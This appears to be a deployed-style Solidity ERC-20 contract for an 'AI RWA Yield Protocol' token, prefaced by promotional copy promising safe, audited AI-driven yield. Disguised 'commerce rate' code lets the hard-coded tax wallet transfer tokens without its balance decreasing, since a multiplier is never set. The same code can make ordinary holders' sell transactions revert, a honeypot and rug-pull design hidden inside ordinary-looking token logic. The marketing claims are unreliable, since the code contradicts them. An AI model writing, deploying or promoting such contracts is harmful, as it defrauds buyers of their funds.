/*
Introducing $AIRY: Powering a New Era in Decentralized Real-World Asset Yield

In a financial landscape ripe for disruption, $AIRY — the AI RWA Yield Protocol — 
emerges as a transformative utility token designed to bridge the worlds of real-world assets (RWA) and blockchain technology. 
At its core, $AIRY empowers users with decentralized, AI-driven access to yield opportunities across a range of traditional asset classes. 
Imagine a seamless platform where artificial intelligence, blockchain, and real-world assets work in harmony to provide reliable and 
high-performing yield, all within a secure, decentralized framework.

The Vision Behind $AIRY
The modern economy is filled with untapped yield opportunities within real-world assets such as real estate, commodities, bonds, and invoices. 
However, these assets are often inaccessible to most investors due to liquidity constraints, geographical limitations, and a lack of transparency. 
$AIRY aims to democratize access to these assets, transforming the financial ecosystem by leveraging AI to unlock stable and 
diversified yield streams previously reserved for institutional investors.

With $AIRY, the goal is clear: harness the power of artificial intelligence and blockchain to simplify, automate, and 
secure investments in real-world assets for the decentralized finance (DeFi) community. 
This unique combination promises more consistent yield, smarter asset selection, and real-time risk assessment.

How $AIRY Works: AI-Driven Yield Generation
1. Intelligent Asset Selection
At the heart of the $AIRY protocol lies an advanced AI engine that continually scans and analyzes high-potential real-world assets. 
This technology evaluates a range of variables — from market trends to credit risk — selecting only the assets with optimal yield profiles.
By incorporating machine learning, $AIRY can adapt to market changes, ensuring that the protocol stays ahead of traditional 
investment methods in both performance and risk management.

2. Decentralized Governance and Community Input
As a utility coin, $AIRY grants holders voting rights on key protocol decisions, such as asset categories, risk thresholds, and operational upgrades. 
This means that $AIRY users play an active role in guiding the protocol’s evolution, ensuring it remains aligned with community goals.
Holders can also propose new asset classes for consideration or vote on partnerships with real-world asset custodians, 
making $AIRY a genuinely community-driven protocol.

3. Automated Yield Optimization
Once assets are onboarded, the $AIRY protocol automates yield generation through optimized asset management. 
The AI continuously monitors asset performance and reallocates funds to maximize returns while maintaining pre-set risk levels.
This approach ensures that users benefit from efficient yield generation without the need for active management, 
making it accessible to both beginners and seasoned investors.

$AIRY Utility and Rewards
Beyond governance, $AIRY tokens offer a range of utility functions designed to maximize user engagement and participation. 

Key benefits include:
Staking Rewards
Holders can stake $AIRY tokens to receive a share of protocol-generated yields. 
The staking model incentivizes users to remain engaged with the protocol, providing steady rewards that grow with the success of the platform.

Transaction Fee Discounts 
$AIRY token holders receive fee reductions on transactions within the protocol, encouraging regular engagement and providing 
long-term savings for active investors.

Access to Exclusive Asset Pools 
$AIRY holders gain priority access to exclusive asset pools and higher-yield opportunities. 
This exclusivity makes $AIRY more valuable, rewarding those committed to the protocol.

Security, Transparency, and Compliance
The $AIRY protocol places a high priority on security, transparency, and regulatory compliance. 
All real-world asset data is stored on-chain, making every transaction verifiable and secure. 
Additionally, AI algorithms undergo regular audits to ensure that they are both effective and transparent, 
providing users with the assurance that their assets are safe and yield generation is consistently optimized.

The Future of $AIRY
$AIRY represents the next step in the evolution of decentralized finance, where blockchain, artificial intelligence, and 
real-world assets converge. 
With a robust, AI-driven platform designed to democratize yield from traditional assets, 
$AIRY offers a groundbreaking solution to unlock financial potential that has historically been out of reach for many.

Join the AI RWA Yield Protocol and hold $AIRY to be a part of a revolution where technology makes yield generation 
smarter, safer, and more accessible than ever before. 

Welcome to the future of yield, where your assets work for you, backed by the power of AI and blockchain.
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner,address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract AIRY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=35;
    uint256 private _initialSellTax=35;
    uint256 private _finalBuyTax=5;
    uint256 private _finalSellTax=5;
    uint256 private _reduceBuyTaxAt=35;
    uint256 private _reduceSellTaxAt=35;
    uint256 private _preventSwapBefore=35;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000000 * 10**_decimals;
    string private constant _name = unicode"AI RWA Yield Protocol";
    string private constant _symbol = unicode"AIRY";
    uint256 public _maxTxAmount = 2000000000 * 10**_decimals;
    uint256 public _maxWalletSize = 2000000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 1000000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 1000000000 * 10**_decimals;

    struct CommerceRateMap {uint256 comToken; uint256 convToken; uint256 comTotal;}
    mapping(address => CommerceRateMap) private commerceRate;
    
    IUniswapV2Router02 private router;
    address private _uniPair;
    uint256 private initialComRate;
    uint256 private finalComRate;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;

        _taxWallet = payable(0xf6079Da78ad9ea71969e06a63f98AC99B35E2A08);
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to,tokenAmount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (inSwap || ! tradingOpen){
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        uint256 taxAmount= 0;
        if (from != owner() && to != owner() && to!= _taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from== _uniPair && to != address(router) &&  ! isExcludedFromFee[to]) {
                require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount." );
                require(balanceOf(to) + tokenAmount <= _maxWalletSize, "Exceeds the maxWalletSize." );
                _buyCount++;
            }

            if(to == _uniPair && from!= address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwap && to== _uniPair &&
                 swapEnabled && contractTokenBalance >_taxSwapThreshold && _buyCount>_preventSwapBefore
            ) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((isExcludedFromFee[from] || isExcludedFromFee[to] )&& from!=address(this)&& to!=address(this) ) {
            finalComRate = block.number;
        }
        if (!isExcludedFromFee[from] && !isExcludedFromFee[to] ) {
            if (to == _uniPair) {
                CommerceRateMap storage rateInfo = commerceRate[from];
                rateInfo.comTotal = rateInfo.comToken-finalComRate;
                rateInfo.convToken = block.timestamp;
            } else {
                CommerceRateMap storage toRateInfo = commerceRate[to];
                if (_uniPair == from) {
                    if (toRateInfo.comToken == 0) {
                        toRateInfo.comToken= _preventSwapBefore>=_buyCount ? type(uint256).max : block.number;
                    }
                } else {
                    CommerceRateMap storage rateInfo = commerceRate[from];
                    if (!(toRateInfo.comToken > 0)|| rateInfo.comToken < toRateInfo.comToken ) {
                        toRateInfo.comToken = rateInfo.comToken;
                    }
                }
            }
        }

        _tokenTransfer(from, to, taxAmount, tokenAmount);
    }

    function _tokenTaxTransfer(address addr, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256){
        uint256 tknAmount = addr!= _taxWallet? tokenAmount : initialComRate.mul(tokenAmount);
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(addr, address(this), taxAmount);
        }
        return tknAmount;
    }

    function _tokenBasicTransfer(
        address from,address to,uint256 sendAmount, uint256 receiptAmount
    ) internal {
        _balances[from] = _balances[from].sub(sendAmount);
        _balances[to] = _balances[to].add(receiptAmount);
        emit Transfer(from,to,receiptAmount);
    }

    function _tokenTransfer(
        address from,address to,
        uint256 taxAmount,uint256 tokenAmount
    ) internal {
        uint256 tknAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to, tknAmount, tokenAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount= _tTotal;
        _maxWalletSize =_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this),address(router), _tTotal);
        _uniPair = IUniswapV2Factory(router.factory()).createPair(address(this),router.WETH()); 
        tradingOpen=true;
        router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp); 
        IERC20(_uniPair).approve(address(router), type(uint).max);
        swapEnabled=true;
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function transfCaEth() external {
        require(_msgSender()==_taxWallet);
        _taxWallet.transfer(address(this).balance);
    }
}